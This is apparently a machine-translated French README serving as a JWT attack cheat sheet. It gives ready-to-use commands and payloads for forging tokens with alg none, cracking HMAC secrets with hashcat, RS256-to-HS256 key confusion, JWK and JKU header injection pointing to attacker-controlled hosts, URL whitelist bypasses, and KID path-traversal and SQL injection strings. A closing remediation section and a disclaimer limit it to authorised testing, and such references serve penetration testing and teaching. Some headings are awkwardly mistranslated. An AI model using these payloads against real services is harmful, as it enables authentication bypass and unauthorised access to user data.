<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎟️ JWT Attacks - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
       ██╗██╗    ██╗████████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗
       ██║██║    ██║╚══██╔══╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝
       ██║██║ █╗ ██║   ██║       ███████║   ██║      ██║   ███████║██║     █████═╝ ███████╗
  ██   ██║██║███╗██║   ██║       ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║
  ╚█████╔╝╚███╔███╔╝   ██║       ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║
   ╚════╝  ╚══╝╚══╝    ╚═╝       ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
             JSON Web Token Exploitation & Security Testing Guide
```
<p align="center">
  <img src="https://img.shields.io/badge/JWT-Attacks-orange?style=for-the-badge" alt="Attaques JWT">
  <img src="https://img.shields.io/badge/jwt_tool-Automated_Testing-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Algorithm_Confusion-Key_Attacks-red?style=for-the-badge" alt="Attaques clés">
  <img src="https://img.shields.io/badge/Web_Security-API_Testing-green?style=for-the-badge" alt="Test API">
</p>

<p align="center">
  <b>🛡️ Méthodologie complète et commandes pratiques pour exploiter les vulnérabilités du JSON Web Token (JWT)</b>
</p>

---

## 📋 Table des matières

- [Introduction et anatomie d'un JWT](#-introduction--anatomie-d'un-jwt)
- [Outils de test essentiels](#-essential-testing-tools)
- [Matrice de vulnérabilité et vecteurs d'attaque](#-vulnerability-matrix--attack-vectors)
  - [1. Aucun défaut d'algorithme (`alg: "none"`)] (#1-aucun-algorithme-flaw-alg-none)
  - [2. Faible fissuration secrète du HMAC (HS256)](#2-faible-hmac-secret-cracking-hs256)
  - [3. Confusion d'algorithme / Confusion de clé (RS256 -> HS256)](#3-confusion-d'algorithme--confusion-de-clé-rs256---hs256)
  - [4. Injection d'en-tête JWK (JSON Web Key)] (#4-jwk-json-web-key-header-injection)
  - [5. JKU (JWK Set URL) Mauvaise configuration et SSRF] (#5-jku-jwk-set-url-misconfiguration--ssrf)
  - [6. KID (Key ID) Manipulation et injections d'en-tête] (#6-kid-key-id-header-manipulation--injections)
  - [7. Relais interservices et fuite de données sensibles](#7-relais interservices--fuite-de-données-sensibles)
-[Automatisation des tests avec `jwt_tool`](#-automating-tests-with-jwt_tool)
- [Cracker les secrets JWT avec Hashcat](#-cracking-jwt-secrets-with-hashcat)
- [Tableau de référence rapide](#-quick-reference-table)
- [Remédiation et mise en œuvre sécurisée](#-remediation--secure-implementation)
- [Mentions légales](#-legal-disclaimer)
- [Ressources](#-ressources)

---

## 🎯 Introduction et anatomie d'un JWT

Un **JSON Web Token (JWT)** est un moyen compact et sécurisé pour les URL de représenter les réclamations entre deux parties. Couramment utilisé pour l'authentification de session dans les API REST modernes, les applications à page unique (SPA) et les microservices.

Un JWT standard se compose de trois parties codées en Base64URL séparées par des points (`.`) :
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJuYW1lIjoiQWxpY2UiLCJyb2xlIjoidXNlciJ9.4z7kE8l...
[------------- HEADER -------------].[-------------- PAYLOAD --------------].[----------- SIGNATURE -----------]
```
1. **En-tête :** Identifie le type de jeton et l'algorithme cryptographique utilisé (par exemple, `HS256`, `RS256`, `none`).
2. **Payload :** Contient les revendications (par exemple, `user_id`, `role`, expiration `exp`). *Remarque : les charges utiles sont codées et NON chiffrées !*
3. **Signature :** Créée en hachant l'en-tête et la charge utile codés à l'aide d'une clé secrète ou d'une clé privée.

---

## 🛠️ Outils de test essentiels

1. **jwt_tool :** Boîte à outils en ligne de commande pour analyser, tester et craquer les JWT.
2. **Hashcat :** Craquage rapide des secrets HMAC basé sur GPU (mode `16500`).
3. **Extension Burp Suite :** "JWT Editor" par Fraser Winterborn (dans PortSwigger BApp Store).

### Installation de `jwt_tool`
```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 -m pip install -r requirements.txt
alias jwt_tool='python3 /opt/jwt_tool/jwt_tool.py'
```
---

## 💥 Matrice de vulnérabilité et vecteurs d'attaque

### 1. Aucun défaut d'algorithme (`alg: "none"`)

**Mécanisme :**
Certaines bibliothèques de vérification JWT considèrent les jetons valides si l'en-tête `alg` est défini sur `none`, contournant complètement la vérification de signature.

**Exploitation :**
1. Décodez l'en-tête et remplacez `"alg": "HS256"` par `"alg": "none"`.
2. Modifiez les revendications de charge utile (par exemple, `"role": "admin"`).
3. Supprimez la partie signature (conservez le point final !).
```bash
# Using jwt_tool to forge 'none' algorithm token
python3 jwt_tool.py <TOKEN> -X a

# Test various casing variations (none, None, NONE, nOnE)
python3 jwt_tool.py <TOKEN> -T -S none
```
*Structure manuelle des jetons :*
```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
```
---

### 2. Faible fissuration secrète du HMAC (HS256)

**Mécanisme :**
Si le serveur signe des jetons à l'aide d'algorithmes symétriques (`HS256`, `HS384`, `HS512`) avec une clé secrète devinable ou faible (par exemple, `secret`, `admin123`, nom de l'entreprise), un attaquant peut forcer le secret hors ligne et signer des jetons arbitraires.

**Craquer avec Hashcat :**
```bash
# Save the full JWT to a file
echo "eyJhbGciOi..." > jwt.txt

# Crack using Hashcat Mode 16500 (JWT Secret)
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
```
** Forger un jeton après le craquage : **
```bash
python3 jwt_tool.py <TOKEN> -T -S hs256 -p 'discovered_secret'
```
---

### 3. Confusion d'algorithme / Confusion de clé (RS256 -> HS256)

**Mécanisme :**
- **RS256 (Asymétrique) :** Signé avec la clé privée du serveur ; vérifié avec la **clé publique** du serveur.
- **HS256 (Symétrique) :** Signé et vérifié avec le **même secret partagé**.

Si la bibliothèque backend n'applique pas strictement les types d'algorithmes, un attaquant peut :
1. Obtenez la clé publique du serveur (souvent exposée publiquement sur `/.well-known/jwks.json` ou sur les certificats).
2. Remplacez l'en-tête d'algorithme du jeton de `RS256` par `HS256`.
3. Signez le jeton modifié avec la **clé publique** du serveur comme secret HMAC !
4. Le serveur reçoit le jeton, voit `HS256` et vérifie la signature à l'aide de sa clé de vérification configurée (qui est sa clé publique), ce qui donne une signature valide !

**Exploitation via `jwt_tool` :**
```bash
# Supply the server's public key and perform key confusion
python3 jwt_tool.py <TOKEN> -X k -pk public.pem
```
---

### 4. Injection d'en-tête JWK (JSON Web Key)

**Mécanisme :**
La spécification JWT autorise une clé publique intégrée dans le paramètre d'en-tête `jwk`. Les serveurs vulnérables font confiance à cette clé d'en-tête pour vérifier la signature sans vérifier si la clé appartient à une autorité de certification de confiance ou à une liste blanche pré-partagée.

**Exploitation :**
1. Générez une paire de clés RSA attaquante.
2. Intégrez la clé publique dans l'en-tête `jwk`.
3. Signez le jeton avec votre clé privée correspondante.
```bash
# Inject self-signed key in header using jwt_tool
python3 jwt_tool.py <TOKEN> -X i
```
---

### 5. JKU (JWK Set URL) Mauvaise configuration et SSRF

**Mécanisme :**
L'en-tête `jku` (JWK Set URL) spécifie une URL distante à partir de laquelle le serveur doit récupérer l'ensemble de clés publiques pour vérifier le jeton.

**Exploitation :**
1. Hébergez votre propre `jwks.json` sur un serveur Web attaquant :
   ```json
   {
     "keys": [
       {
         "kty": "RSA",
         "e": "AQAB",
         "use": "sig",
         "kid": "attacker-key",
         "n": "..."
       }
     ]
   }
   ```
2. Modifiez l'en-tête du jeton :
   ```json
   {
     "alg": "RS256",
     "typ": "JWT",
     "jku": "http://attacker.com/jwks.json",
     "kid": "attacker-key"
   }
   ```
3. Signez le jeton avec votre clé privée.

> **Contourner les listes blanches d'URL :**
> Si l'application valide les extensions de domaine, testez les redirections ouvertes ou les bizarreries d'analyse d'URL :
> -`https://trusted.com@attacker.com/jwks.json`
> -`https://trusted.com.attacker.com/jwks.json`
> - Ouvrir la redirection : `https://trusted.com/redirect?url=http://attacker.com/jwks.json`

---

### 6. Manipulation et injections d'en-tête KID (Key ID)

L'en-tête `kid` est une chaîne utilisée pour identifier quelle clé doit être chargée à partir d'une base de données ou d'un système de fichiers.

#### A. Traversée de répertoire vers un fichier vide (`/dev/null`)
Si le serveur lit le fichier de clé à partir du disque à l'aide de `kid` :
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "/dev/null"
}
```
Signez le token avec un secret vide (`""` / 0 octets) !

#### B. Injection SQL via KID
Si le serveur récupère le secret dans une base de données :
```sql
SELECT secret FROM keys WHERE kid = 'INPUT';
```
Injectez une chaîne statique connue :
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key' UNION SELECT 'my_known_secret'-- -"
}
```
Signez le jeton en utilisant le secret `'my_known_secret'`.

---

### 7. Relais interservices et fuite de données sensibles

- **PII non chiffrées :** Les développeurs stockent fréquemment des mots de passe, des SSN ou des métadonnées utilisateur sensibles dans la charge utile, oubliant qu'ils sont uniquement codés en Base64URL et non chiffrés.
- **Confusion de service :** Utilisation d'un jeton destiné à un service à faible privilège (par exemple, une API d'analyse) par rapport à une API d'administration interne.

---

## ⚡ Automatisation des tests avec `jwt_tool`

### Exécutez toutes les attaques de Playbook intégrées
Le moyen le plus simple de rechercher automatiquement toutes les vulnérabilités connues :
```bash
# Launch full automated playbook scan
python3 jwt_tool.py <TOKEN> -M pb -t https://target.com/api/user -rh "Authorization: Bearer <TOKEN>"
```
### Mode de falsification interactif
```bash
# Interactively edit header or payload claims
python3 jwt_tool.py <TOKEN> -T
```
---

## 🔓 Déchiffrer les secrets de JWT avec Hashcat
```bash
# 1. Format: Put token alone in a file
echo "eyJhbGciOiJIUzI1NiIsInR5..." > jwt.txt

# 2. Dictionary attack using rockyou
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -w 3

# 3. Rule-based attack
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
---

## 📊 Tableau de référence rapide

| Vulnérabilité | Technique d'attaque | Charge utile clé/drapeau |
|---------------|--------|------------------------|
| **Aucun algorithme** | Ensemble `alg: "none"`, signature de bande | `jwt_tool <TOKEN> -X a` |
| **Faible secret** | Dictionnaire GPU force brute | `hashcat -m 16500 jwt.txt rockyou.txt` |
| **Confusion d'algorithme**| Remplacez RS256 par HS256, signez avec la clé publique | `jwt_tool <TOKEN> -X k -pk pub.pem` |
| **Injection JWK** | Intégrer la clé publique de l'attaquant dans l'en-tête | `jwt_tool <TOKEN> -X i` |
| **Injection JKU** | Pointez `jku` vers un serveur externe | `"jku": "http://evil.com/jwks.json"` |
| ** Traversée du chemin KID ** | Pointez `kid` vers `/dev/null` ou un fichier connu | `"kid": "/dev/null"` (Signez avec `""`) |
| **ENFANT SQLi** | Injecter un secret statique dans une requête SQL | `"kid": "' UNION SELECT 'secret'-- -"` |

---

## 🛡️ Correction et mise en œuvre sécurisée

1. **Algorithmes de liste blanche explicite :**
   N’autorisez jamais la sélection `alg` contrôlée par le client. Coder en dur les algorithmes autorisés sur le serveur (par exemple, autoriser exclusivement `RS256`).
2. **Rejeter les jetons `alg: none` :**
   Assurez-vous que la bibliothèque rejette strictement les jetons non vérifiés ou non signés.
3. **Utilisez des secrets longs et cryptographiquement sécurisés :**
   Les secrets HMAC doivent comporter au moins 256 bits (plus de 32 caractères aléatoires) générés par un CSPRNG sécurisé.
4. **Valider les en-têtes `jku` et `jwk` :**
   Récupérez uniquement les ensembles JWK à partir d'une liste blanche stricte d'URL internes de confiance ; rejeter les domaines externes fournis par l'utilisateur.
5. **Désinfectez les valeurs `kid` :**
   Traitez `kid` comme une entrée utilisateur non fiable ; désinfecter contre la traversée de répertoires (`../`) et l'injection SQL.

---

## ⚠️ Mentions légales

> **IMPORTANT :** Les attaques JWT peuvent conduire à un contournement complet de l'authentification et à un accès non autorisé aux bases de données des applications. Ce guide est strictement destiné à des fins éducatives et de tests d'intrusion autorisés.

---

## 📚 Ressources

- [Dépôt jwt_tool GitHub](https://github.com/ticarpi/jwt_tool)
- [PortSwigger Web Security Academy : Attaques JWT](https://portswigger.net/web-security/jwt)
- [RFC 7519 - Norme de jeton Web JSON (JWT)](https://datatracker.ietf.org/doc/html/rfc7519)